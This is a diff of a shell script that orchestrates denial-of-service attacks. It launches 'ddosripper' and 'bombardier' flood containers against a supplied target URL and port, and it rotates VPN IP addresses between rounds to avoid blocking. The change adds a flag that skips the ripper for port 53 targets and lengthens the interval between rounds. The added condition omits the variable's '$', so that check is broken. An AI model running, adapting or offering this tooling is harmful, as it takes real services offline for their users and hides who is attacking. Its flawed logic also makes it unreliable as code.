@@ -7,6 +7,7 @@ init(){
     export VPN_TYPE=$6
     export TARGET_PORT=$2
     export R_TARGET_URL=$1
+    export RUN_RIPPER=1
     scheme="http://"
     updSuffix=""
     if [ "$TARGET_PORT" -eq "443" ]
@@ -15,6 +16,7 @@ init(){
     fi
     if [ "$TARGET_PORT" -eq "53" ]
     then
+        RUN_RIPPER=0
         scheme=""
         updSuffix="/UDP"
     fi
@@ -40,7 +42,10 @@ change_ip(){
 runAll(){
     start_vpn
     echo "Executing..."
-    sudo -E docker-compose run -d ddosripper
+    if [ RUN_RIPPER -eq 1 ]
+    then
+        sudo -E docker-compose run -d ddosripper
+    fi
     sleep 10s
     echo "Logs:"
     sudo docker logs --since 20s $(sudo docker-compose ps -q ddosripper)
@@ -48,7 +53,7 @@ runAll(){
     do
         echo "Running all $i time. U=$VPN_USER C=$VPN_CODE C=$VPN_COUNTRY $B_TARGET_URL $R_TARGET_URL"
         sudo -E docker-compose run -d --rm bombardier
-        sleep 60s
+        sleep 120s
         change_ip
         echo "Logs:"
         sudo docker logs --since 30s $(sudo docker-compose ps -q ddosripper)
